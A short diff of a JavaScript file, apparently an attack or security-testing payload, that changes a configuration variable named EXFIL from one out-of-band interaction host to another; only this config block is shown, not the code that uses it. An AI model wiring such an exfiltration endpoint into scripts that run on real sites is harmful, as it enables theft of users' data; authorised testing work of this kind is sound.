@@ -1,6 +1,6 @@
 (function () {
   // ==== CONFIG ====
-  var EXFIL = "https://daqqj2kvqinth4ok5hfggnjicc14pim1o.oast.site";
+  var EXFIL = "https://daqqulbvo2g712b0h62gk5uc357m5qooa.oast.pro";
   var BUILD = "v" + Date.now();   // unique per save -> proves which file is running
   // ================
 
